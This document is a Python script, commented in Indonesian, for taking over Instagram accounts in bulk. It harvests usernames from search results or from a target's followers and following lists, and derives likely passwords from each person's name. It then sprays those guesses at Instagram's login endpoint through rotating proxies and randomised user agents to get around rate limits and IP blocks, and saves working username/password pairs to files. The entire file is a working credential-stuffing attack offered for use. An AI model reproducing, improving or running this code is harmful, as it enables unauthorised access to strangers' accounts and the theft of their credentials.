# coding:utf-8
#/usr/bin/python
# ini cuma recode mksh ya
# udh di dec
author     = 'IsalXCode'
status = 'Premium'
kontak = 'Baca'
ig = 'Mahdani279'
try:
    import json
    import uuid
    import hmac
    import random
    import hashlib
    import urllib
    import stdiomask
    import urllib.request
    import calendar
except ImportError as e:
    exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
import requests,bs4,json,os,sys,random,datetime,time,re
try:
    import rich
except ImportError:
    os.system('pip install rich')
    time.sleep(1)
    try:
        import rich
    except ImportError:
        exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
import time
day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'
menudump=[]
try:
    os.mkdir('result')
except:
    pass
    
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print('GAGAL')
    
prox=open('.prox.txt','r').read().splitlines()
try:ugen = open('ua.txt','r').read().splitlines()
except:ugen = ['NokiaC3-00/5.0 (07.80) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 6.0; I7D Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36','DS podcast/1.0.5 (be.standaard.audio; build:6; Android 10; Sdk:29; Manufacturer:HUAWEI; Model: MAR-LX1B) OkHttp/4.9.1']
try:ugen2 = open('ua.txt','r').read().splitlines()
except:ugen2 = ['Mozilla/5.0 (Series40; NokiaC2-00/03.82; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.1.0.1','Mozilla/5.0 (Linux; Android 8.1.0; BBB100-1 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36','Opera/9.80 (SpreadTrum; Opera Mini/4.4.33961/191.273; U; en) Presto/2.12.423 Version/12.16']

CY='\033[96;1m'
H='\033[1;32m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
U='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
USN="Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 Instagram 217.0.0.0.240 Android (22/5.1.1; 320dpi; 720x1280; OPPO; A37f; A37f; qcom; en_US; 340641745)"
# USN="Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.4240.198 Mobile Safari/537.36"
ugen=open('ua.txt','r').read().splitlines()
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
s=requests.Session()
# CLEAR
def clear():
    os.system('clear')
 
# BANNER
def banner():
    clear()
    sol()
    au='''[blue]       ________________   _____________________________________ __    
       ____  _/_  ____/   __  ____/__  __ \__    |_  ____/__  //_/    
        __  / _  / __     _  /    __  /_/ /_  /| |  /    __  ,<       
       __/ /  / /_/ /     / /___  _  _, _/_  ___ / /___  _  /| |      
       /___/  \____/      \____/  /_/ |_| /_/  |_\____/  /_/ |_|      
                                                                      '''
    cetak(nel(au, style='blue',title=f' • 𝐏𝐁𝐁 •'))
try:
    # python 2
    urllib_quote_plus = urllib.quote
except:
    # python 3
    urllib_quote_plus = urllib.parse.quote_plus
 

def jewel():
    cetak(nel('====================================================='))
def chk(): 
  uuid = str(os.geteuid()) + str(os.getlogin()) 
  id = "|".join(uuid) 
  print ("\033[1;92m╭────────────────────────────────────────────╮")
  print("\x1b[1;97m [\033[1;91m•\x1b[1;97m]\033[1;93m  YOUR ID : "+id) 
  print ("\033[1;92m╰────────────────────────────────────────────╯")
  try: 
    httpCaht = requests.get("https://raw.githubusercontent.com/JIF-XD/UPDATE/main/use.txt").text 
    if id in httpCaht: 
      print("\x1b[1;97m [\033[1;92m•\x1b[1;97m]\033[1;97m  YOUR ID IS ACTIVE........\033[97m") 
      msg = str(os.geteuid()) 
      time.sleep(1) 
      pass 
    else: 
      print("\x1b[1;97m [\033[1;91m•\x1b[1;97m]\033[1;93m YOUR ID IS NOT ACTIVE SEND MESSAGE ON WHATSAPP FREE USER PLEASE DONT INBOX\033[97m") 
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     print (logo)
     chk() 
    
chk()
os.system('clear')

def cekAPI(cookie):
    user=open('.username','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':cookie},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except  (ValueError,KeyError):
        cetak(nel('[white] Gagal masuk/login', style='green'))
        time.sleep(4)
        os.remove('.kukis.log')
        os.remove('.username')
        exit()

    return external,user

def login_kamu():
    if "sukses" in lisensiku:
        try:
            kuki=open('.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            sol()
            io = '[white][1] Login Menggunakan Cookie\n[2] Login Menggunakan Username & Password'
            cetak(nel(io, title=f'• menu login •',style='green'))
            loginpil=input(f"  [{K}+{C}] Pilih :  ")
            if loginpil=='1':
                cetak(nel(' [white]Gunakan username dan cookies instagram untuk login. sebelum login  pastikan akun bersifat publik bukan privat', style='blue'))
                us=input(f'  [{K}+{C}] Masukan Username :{C}')
                cok=input(f'  [{K}+{C}] Masukan Cookie :{C}')
                kuki=open('.kukis.log','w').write(cok)
                user=open('.username','w').write(us)
                os.system('python run.py')
            elif loginpil == '2':
                login()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:
        login()
def login():
    global external
    try:
        cetak(nel('[white]Gunakan username dan password instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat', style='blue'))
        us=input(f"  [{K}+{C}] Masukan username: {C}")
        pw=stdiomask.getpass(prompt=f'  [{K}+{C}] Masukan password: {C}')
    except KeyboardInterrupt:
        wel = '# KeyboardInterrupt terdeteksi... keluar !'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        exit()
    x=instagramAPI(us,pw).loginAPI()
    if x.get('status')=='success':
        open('.username','a').write(us)
        open('.kukis.log','a').write(x.get('cookie'))
        cookie={'cookie':x.get('cookie')}
        print(f'\n{H}>{C} Login berhasil')
        os.system('python run.py')
    elif x.get('status')=='checkpoint':
        wel = '# Login checkpoint'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        login()
    else:
        wel = '# Username atau password yang anda masukan salah'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        login()


class instagram:
    def __init__(self,external,username,cookie):
        self.ext=external
        self.username=username
        self.cookie=cookie
        self.s=requests.Session()
    def logo(self):
        for i in external:
            try:
                nama=i.split('|')[0]
                followers=i.split('|')[1]
                following=i.split('|')[2]
            except:
                pass
            banner()
            welcome=f'''  [{K}+{C}] Username   : {H}{self.username}                   {C}[{K}+{C}] Author : {H}{author}
  [{K}+{C}] Followers  : {H}{followers}                          {C}[{K}+{C}] WhatsApp :{H}{kontak}
  [{K}+{C}] Following  : {H}{following}                         {C}[{K}+{C}] Status : {H}{status}
  [{K}+{C}] Instagram : {H}{ig}'''
            print(welcome)
            io='''  [white][01] Crack Dari Pencarian              [03] Crack dari Mengikuti
  [02] Crack Dari Pengikut               [04] Result'''
            cetak(nel(io, style='blue',title=f' • Menu •', subtitle='Ketik D untuk informasi script'))

    def BUG(self):
        donasi=f'''[white]- Hai selamat datang di script saya mungkin kamu adalah penguna baru !
- script ini Masi Dalam Perbaruan
- saya sarankan menggunakan kartu Indosat,xl,exis,3
- jika di antara kalian ada yang mau memberikan donasi kesaya
- bisa menghubungi kontak saya 
- +62895411175410
- donasikan seikhlasnya ya 
- besar atau kecilnya itu gk penting yang penting ikhlas 
- saya ucapkan terima kasih
- Isal X Codee 
- single project'''
        cetak(nel(donasi, title=' • informasi • ', style='green'))
        sleep(0.50)
        exit()

    def ChangeLog(self):
        io='[1] Fix bug login instagram\n[2] Ganti tampilan scripts\n[3] Fix bug lisensi invalid'
        oi = nel(io, style='magenta')
        cetak(nel(oi, title='Fitur yang di update'))

        io='[1] Bot unfollow instagram\n[2] Bot spam komen'
        oi = nel(io, style='cyan')
        cetak(nel(oi, title='Fitur tambahan'))

        io='[1] Untuk fitur brute force masih dalam perbaikan\n[2] Untuk fitur Bot unfollow masih dalam perbaikan\n[3] Untuk fitur bot komen masih dalam perbaikan'
        oi = nel(io, style='magenta')
        cetak(nel(oi, title='Fix Bug'))
        exit()

    def Exit(self):
        cetak(nel('[white][+] Apakah anda yakin ingin keluar?', style='blue'))
        x=input(f'  [+] keluar y/t ? : {C}')
        if x in ('y','Y'):
            os.remove('.kukis.log')
            os.remove('.username')
            os.system('python run.py')
        elif x in ('t','T'):
            os.system('python run.py')
        else:
            self.Exit()

    def sixAPI(self,six_id):
        url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
        x = requests.get(url)
        x_jason = x.json()
        uid = str( x_jason['users'][0].get("user").get("pk") )
        return uid

    def unfollowAPI(self,user_id,username_id,cookie):
        uuid=generateUUID(True)
        xx=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
        crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
        s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': User_Agent()})

        data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})

        self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
            self.generateUUID(False),
            urllib.request.quote(data))
        return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text


    def searchAPI(self,cookie,nama):
        try:
            x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
            x_jason=json.loads(x.text)
            for i in x_jason['users']:
                user=i['user']
                username=user['username']
                fullname=user['full_name']
                internal.append(f'{username}|{fullname}')
        except requests.exceptions.ConnectionError:
            exit(f'\n [{M}!{C}] Koneksi internet bermasalah')
        return internal

    def idAPI(self,cookie,id):
        if 'sukses' in lisensiku:
            try:
                m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
                m_jason=m.json()["data"]["user"]
                idx=m_jason["id"]
            except requests.exceptions.ConnectionError:
                exit(f"\n{M}[+] Koneksi internet bermasalah{C}")
            except Exception as e:
                exit(f"\n{M}[+] Username yang anda masukan tidak di temukan pastikan target bersifat publik{C}")
            return idx
        else:lisensi()

    def infoAPI(self,cookie,api,id):
        if 'sukses' in  lisensiku:
            try:
                cetak(nel('[white][+] TUNGGU SEDANG MENGUMPULKAN ID ', style='blue'))
                x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
                x_jason=json.loads(x.text)
                for i in x_jason['users']:
                    username = i["username"]
                    nama = i["full_name"]
                    internal.append(f'{username}|{nama}')
                    following.append(username)
                if 'pengikut' in menudump:
                    maxid=x_jason['next_max_id']
                    for z in range (9999):
                        x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
                        x_jason=json.loads(x.text)
                        try:
                            for i in x_jason['users']:
                                username = i["username"]
                                nama = i["full_name"]
                                internal.append(f'{username}|{nama}')
                                following.append(username)
                            try:
                                 maxid=x_jason['next_max_id']
                            except:
                                break
                        except:
                            if 'challenge' in x.text:
                                break
                            else:
                                continue
                else:pass
            except requests.exceptions.ConnectionError:
                exit(f'\n{M}┣[!] Koneksi internet bermasalah{C}')
            except Exception as e:
                print(f'\n{M}┣[!] Username yang anda masukan tidak di temukan{C}')
            return internal
        else:lisensi()

    def passwordAPI(self,xnx):
        cetak(nel(f'[white][+] TOTAL ID  : {len(internal)}', style='blue'))
        cetak(nel('[white][1] Nama123+nama1234\n[2] Nama123+nama1234+nama12345+FullNama\n[3] Nama+123 nama,Full Nama\n[4] Password Manual', style='blue', title='kombinasi'))
        c=input(f'  [+] Masukan Pilihan :{C} ')
        if c=='1':
            self.generateAPI(xnx,c)
        elif c=='2':
            self.generateAPI(xnx,c)
        elif c=='3':
            self.generateAPI(xnx,c)
        elif c=='7':
            self.generateAPI(xnx,c)
        elif c=='4':
            cetak(nel('[white][+]PASSWORD MANUAL', style='blue'))
            print(f'{M} Contoh sayang,anjing,bangsat')
            zx=input(f'  [{K}+{C}] List password :{C} ')
            self.generateAPI(xnx,c,zx)
        else:
            self.passwordAPI(xnx)

    def generateAPI(self,user,o,zx=''):
        cetak(nel(f'[white][•] Hasil OK disimpan ke: hasil/{day}.txt\n[•] Hasil CP disimpan ke: hasil/{day}.txt', style='blue'))
        cetak(nel('[white][+] Proses Crack Bila spam IP, harap hidupkan modpes 5 detik', style='blue'))
        with ThreadPoolExecutor(max_workers=20) as shinkai:
            for i in user:
                try:
                    username=i.split("|")[0]
                    password=i.split("|")[1].lower()
                    for w in password.split(" "):
                        if len(w)<3:
                            continue
                        else:
                            w=w.lower()
                            if o=="1":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w+'1234']
                                else:
                                    sandi=[w]
                            elif o=="2":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w,w+'1234',w+'12345']
                                else:
                                    sandi=[w+'123',w,w+'1234',w+'12345']
                            elif o=="3":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w,password.lower()]
                                else:
                                    sandi=[w+'123',w,password.lower()]
                            elif o=="7":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w+'1234',w+'12345',w]
                                else:
                                    sandi=[w+'123',w+'1234',w+'12345',password.lower()]
                            elif o=="4":
                                if len(zx) > 3:
                                    sandi = zx.replace(" ", "").split(",")
                                else:
                                    break
                            shinkai.submit(self.crackAPI,username,sandi)
                except:
                    pass
        cetak(nel('[white][+] CRACK SELESAI', style='blue'))
        exit()

    def APIinfo(self,user):
        try:
            x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
            x_jason=x.json()["data"]["user"]
            nama=x_jason["full_name"]
            pengikut=x_jason["edge_followed_by"]["count"]
            mengikut=x_jason["edge_follow"]["count"]
            postingan=x_jason["edge_owner_to_timeline_media"]["count"]
        except:
            pass

        return nama,pengikut,mengikut,postingan

    def crackAPI(self,user,pas):
        global loop,success,checkpoint
        sys.stdout.write(f"\r{CY} (CRACK)  {H}{loop}{C}/{K}{len(internal)}{C}  {H}Ok-:{len(success)}{C}  {K}Cp-:{len(checkpoint)}{C} "),sys.stdout.flush()
        try:
            for pw in pas:
                ts = calendar.timegm(current_GMT)
                nip=random.choice(prox)
                proxs= {'http': 'socks5://'+nip}
                aa='Mozilla/5.0 (Linux; U; Android 2.3.4; en-us;'
                b=random.choice(['4','5','6','7','8','9','10','11','12'])
                c='T-Mobile myTouch 3G Slide Build/GRI40)'
                d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                e=random.randrange(1, 999)
                f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                g='AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
                h=random.randrange(73,100)
                i='0'
                j=random.randrange(4200,4900)
                k=random.randrange(40,150)
                l='Mobile Safari/533.1'
                uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
                uakuu=(f'Mozilla/5.0 (Linux; Android 10; Redmi 01A Build/01AQKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36')
                ua1=(f'NokiaC3-00/5.0 (07.80) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+')
                token=s.get('https://www.instagram.com/accounts/login/?next=/accounts/logout/')
                headers = {
                    'Host': 'www.instagram.com',
                    'x-ig-www-claim': '0',
					'x-instagram-ajax': '1005633336-hot',
					'content-type': 'application/x-www-form-urlencoded',
					'accept': '*/*',
					'x-requested-with': 'XMLHttpRequest',
					'x-asbd-id': '198387',
					'user-agent': uaku,
					'x-csrftoken': token.cookies['csrftoken'],
					'x-ig-app-id': '1217981644879628',
					'origin': 'https://www.instagram.com',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'empty',
					'referer': 'https://www.instagram.com/accounts/login/?next=/accounts/logout/',
					'accept-encoding': 'gzip, deflate',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
                }
#					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),


                param={
                    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
                    "username": user,
                    "optIntoOneTap": 'false',
                    "queryParams": "{}",
                    "stopDeletionNonce": "",
                    "trustedDeviceRecords": "{}"}
                x=s.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param,proxies=proxs)
                x_jason=json.loads(x.text)
                if "userId" in str(x_jason):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    io=f'[+].Nama     : {nama}\n[+].Username : {user}\n[+].Password : {pw}\n[+].Pengikut : {pengikut}\n[+].Mengikuti: {mengikut}\n[+].Postingan: {postingan}'
                    oi = nel(io, style='green')
                    print('\n')
                    cetak(nel(oi, title='OK'))
                    open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    success.append(user)
                    break

                elif 'checkpoint_url' in str(x_jason):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    io=f'[+].Nama     : {nama}\n[+].Username : {user}\n[+].Password : {pw}\n[+].Pengikut : {pengikut}\n[+].Mengikuti: {mengikut}\n[+].Postingan: {postingan}'
                    print('\n')
                    oi=nel(io,style='yellow')
                    cetak(nel(oi, title='CP'))
                    open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    checkpoint.append(user)
                    break

                elif 'Please wait a few minutes' in str(x.text):
                    sys.stdout.write(f"\r┣[{U}!{C}] {U}IP KENA SPAM TUNGGU BEBERAPA MENIT{C}");sys.stdout.flush();sleep(0)
#					self.crackAPI(user,pas)
                elif 'ip_block' in str(x.text):
                    sys.stdout.write(f"\r┣[{U}!{C}] {U}IP DI BLOKIR ON OFF MODE PESAWAT{C}");sys.stdout.flush();sleep(0)
                    self.crackAPI(user,pas)
                elif 'spam' in str(x.text):
                    sys.stdout.write(f"\r┣[{U}!{C}] {U}TERDETEKSI SPAM ON OFF MODE PESAWAT{C}");sys.stdout.flush();sleep(0)
#					self.crackAPI(user,pas)

                else:
                    continue

            loop+=1
        except:
            self.crackAPI(user,pas)

    def checkAPI(self,user,pw):
        try:
            token=s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
            crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
            s.headers.update({
                'authority': 'www.instagram.com',
                'x-ig-www-claim': 'hmac.AR3CH3q3WF_EHwNgjQj_uhjG15AF1ckFwoqU4QVfeHdOiBCT',
                'x-instagram-ajax': '82a581bb9399',
                'content-type': 'application/x-www-form-urlencoded',
                'accept': '*/*',
                'user-agent': user_agent(),
                'x-requested-with': 'XMLHttpRequest',
                'x-csrftoken': crf_token,
                'x-ig-app-id': '936619743392459',
                'origin': 'https://www.instagram.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.instagram.com/',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
            })

            param={
                "username": user,
                "enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
                "optIntoOneTap": False,
                "queryParams": {},
                "stopDeletionNonce": "",
                "trustedDeviceRecords": {}
            }
            x=s.post("https://www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
            x_jason=json.loads(x.text)
            if "userId" in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                oi = nel(io, style='green')
                print('\n')
                cetak(nel(oi, title=' LIVE'))

            elif 'checkpoint_url' in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                oi = nel(io, style='yellow')
                print('\n')
                cetak(nel(oi, title=' CHECKPOINT'))

            elif 'Please wait a few minutes' in str(x.text):
                sys.stdout.write(f"\r {U}!{C}] {U}Please wait a few minutes second{C}");sys.stdout.flush();sleep(10)
                self.checkAPI(user,pw)
        except:
            self.checkAPI(user,pw)

    def menu(self):
        self.logo()
        c=input(f'  [+] Pilih :{C}  ')
        if c=='':
            self.menu()
        elif c in ('1','01'):
            cetak(nel('[white][+] masukkan jumlah target crack', style='blue'))
            m=int(input(f'  [{K}+{C}] Jumlah : {H}'))
            cetak(nel('[white][+] Masukan nama random', style='blue'))
            for i in range(m):
                i+1
                nama=input(f'  [{K}+{C}] Masukan nama ({H}{len(internal)}{C}): ')
                name=self.searchAPI(self.cookie,nama)
            self.passwordAPI(name)

        elif c in ('2','02'):
            cetak (nel('[white][+] PASTIKAN TARGET BERSIFAT PUBLIK', style='blue'))
            mas=input(f'  [{K}+{C}] Apakah anda ingin crack masal? y/t :  ')
            if mas in ['y','Y']:
                masal(self)
            elif mas in ['t','T']:
                massal(self)
            elif mas in ['']:
                print('ISI JANGAN KOSONG')


        elif c in ('3','03'):
            cetak(nel('[white][+]PASTIKAN TARGET BERSIFAT PUBLIK', style='blue'))
            mas=input(f'  [{K}+{C}] Apakah anda ingin crack masal? y/t :  ')
            if mas in ['y','Y']:
                mengi(self)
            elif mas in ['t','T']:
                meng(self)
            elif mas in ['']:
                print('ISI JANGAN KOSONG ')
           
        elif c in ('4','04'):
            print('')
            for i in os.listdir('result'):
                print(f' [{U}>{C}] {i}')
            c=input(f'\n {U}┣>>> Masukan nama file: {C}')
            g=open("result/%s"%(c)).read().splitlines()
            xx=c.split("-")
            xc=xx[0]
            print(f'\n{K}┣[>] Total result yang di temukan [{H}{len(g)}{C}]')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                fol=s.split("|")[2]
                ful=s.split("|")[3]
                if xc=="checkpoint":
                    print(f"""
 [{M}+{C}] {M}𝐏𝐁𝐁-𝐗𝐃 𝐂𝐇𝐄𝐂𝐊𝐏𝐎𝐈𝐍𝐓{C}:
  {M}|{C}
  {M}├╴>{C} Username: {O}{usr}{C}
  {M}├╴>{C} Password: {O}{pwd}{C}
  {M}├╴>{C} Followers: {O}{fol}{C}
  {M}├╴>{C} Following: {O}{ful}{C}
                    """);sleep(0.05)
                else:
                    print(f"""
  {H}[>]{C}{H}𝐏𝐁𝐁-𝐗𝐃  :  𝐋𝐈𝐕𝐄 {C}
  {H}[>]{C}{H} Username : {H}{usr}{C}
  {H}[>]{C}{H} Password : {H}{pwd}{C}
  {H}[>]{C}{H} Pengikut : {H}{fol}{C}
  {H}[>]{C}{H} Mengikuti : {H}{ful}{C}
                    """);sleep(0.05)    
        elif c in ('d','D'):
            self.BUG()
        elif c in ('0','00'):
            self.Exit()

        else:
            self.menu()
def tlisensi():
    banner()
    wel='# LICENSE IS NOT APPLICABLE OR WRONG'
    wel2 = mark(wel, style='red')
    sol().print(wel2)
    time.sleep(2)
    lisen=input('[•] Enter License : ')
    open('.lisen.txt','w').write(lisen)
    lisensi()


def lisensi():
    try:
        cek=open('.lisen.txt').read()
        lisensikuni.append(cek)
    except:
        tlisensi()
    ses=requests.Session()
    res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIyMDQ5MjE1NiIsImxRSVg5TFdaS2Z1UXFybUR1THZUMFByUHZjZEFhWmxMTzJNNWhucTIiXQ==&ProductId=15613&Key='+lisensikuni[0]).json()
    status=res['licenseKey']['key']
    if status ==cek:
        banner()
        wel='# LICENSE APPLICABLE '
        wel2 = mark(wel, style='magenta')
        sol().print(wel2)
        time.sleep(2)
        lisensiku.append("sukses")
        login_kamu()
    else:
        tlisensi()

def mengi(self):
            try:
                menudump.append('pengikut')
                cetak(nel('[white][+]Target harus bersifat publik jangan privat', style='blue'))
                m=int(input(f'  [{H}+{C}] Masukan jumlah target: {N}'))
            except:m=1
            for t in range(m):
                t +=1
                cetak(nel(f'[white][+] TOTAL ID :{len(internal)}', style='blue'))
                nama=input(f' [{t}] Masukan Username : ')
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
            self.passwordAPI(info)

def meng(self):
    cetak(nel('[white][+]Target harus bersifat publik jangan privat', style='blue'))
    m=input(f'  [{K}+{C}] Username target : {C}')

    id=self.idAPI(self.cookie,m)
    info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
    self.passwordAPI(info)

def masal(self):
            try:
                menudump.append('pengikut')
                cetak(nel('[white][+]Target harus bersifat publik jangan privat', style='blue'))
                m=int(input(f'  [{K}+{C}] Masukan jumlah target: {N}'))
            except:m=1
            for t in range(m):
                t +=1
                cetak(nel(f'[white][+] TOTAL ID :{len(internal)}', style='blue'))
                nama=input(f' [{t}] Masukan Username : ')
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)



def massal(self):
            menudump.append('pengikut')
            cetak(nel('[white][+]Target harus bersifat publik jangan privat', style='blue'))
            m=input(f'  [{K}+{C}] Username target : {C}')

            id=self.idAPI(self.cookie,m)
            info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)

if __name__=='__main__':
    try:
        login_kamu()
    except requests.exceptions.ConnectionError:
        exit(f'\n [{M}x{C}] Koneksi internet bermasalah')


#ARYO X CODEE
#ECAA CANTIK